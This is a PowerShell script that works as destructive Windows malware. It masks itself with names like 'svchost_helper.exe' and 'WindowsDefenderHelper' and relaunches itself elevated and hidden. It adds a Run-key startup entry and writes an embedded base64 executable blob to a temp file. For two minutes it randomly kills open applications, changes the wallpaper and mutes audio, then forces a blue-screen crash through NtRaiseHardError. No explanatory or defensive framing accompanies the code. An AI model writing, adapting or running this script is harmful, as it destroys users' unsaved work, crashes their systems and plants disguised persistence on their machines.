Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class BsodHelper {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, int Client, out bool WasEnabled);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ResponseOption, out int Response);
}
"@

function Invoke-Bsod {
    $priv = [BsodHelper]::RtlAdjustPrivilege(19, $true, 0, [ref]$null)
    $response = 0
    [BsodHelper]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
}

function Add-ToStartup {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $exePath = [System.IO.Path]::Combine($env:TEMP, "svchost_helper.exe")
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    Set-ItemProperty -Path $regPath -Name "WindowsDefenderHelper" -Value $exePath -Type String -Force
}

function Get-AdminAccess {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $selfPath = [System.IO.Path]::Combine($env:TEMP, "svchost_helper.exe")
        Start-Process -FilePath $selfPath -Verb RunAs -WindowStyle Hidden
        exit
    }
}

function Start-Show {
    $startTime = Get-Date
    $endTime = $startTime.AddSeconds(120)
    $showActions = @(
        { Start-Process -FilePath "notepad.exe" -WindowStyle Hidden },
        { Set-Wallpaper -Path (Get-ChildItem -Path "$env:USERPROFILE\Pictures" -Filter *.jpg -ErrorAction SilentlyContinue | Get-Random | Select-Object -ExpandProperty FullName) },
        { $wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys([char]175) },
        { (New-Object Media.SoundPlayer "C:\Windows\Media\notify.wav").PlaySync() },
        { (Get-Process | Where-Object { $_.MainWindowTitle } | Get-Random).Kill() }
    )
    
    while ((Get-Date) -lt $endTime) {
        $action = $showActions | Get-Random
        try { & $action } catch {}
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
    }
}

function Set-Wallpaper($Path) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $Path, 0x01 -bor 0x02)
}

Get-AdminAccess
Add-ToStartup
$encryptedBytes = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAF2+2FcAAAAAAAAAAOAAAiELAQsAACgAAAAGAAAAAAAAMikAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAFApAABLAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAADkJwAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAvCcAAAAgAAAAKAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAYAAAAqAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAALgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABAKQAAAAAAAEgAAAACAAUAQCgAAKAGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswBACNAAAAAQAAEQACewEAAAQKBgJvAgAACgIXKgATMAQAQwAAAAIAABECAnsBAAAEAgYXWAsCBwJ7AQAABAYXWgwrBxYNKwYXCisEFgorAxYqBwSOaR8cjmlaDCsCCwLeDCoAABMwAwAxAAAAAwAAEQACewIAAAQCewMAAAQCAgYXWRYCAgYXWgJ7AwAABBYCewIAAAQXF1kXWRhaDCsCCwLeDCoA')
Set-Content -Path "$env:TEMP\payload.bin" -Value $encryptedBytes -Encoding Byte
Start-Show
Invoke-Bsod
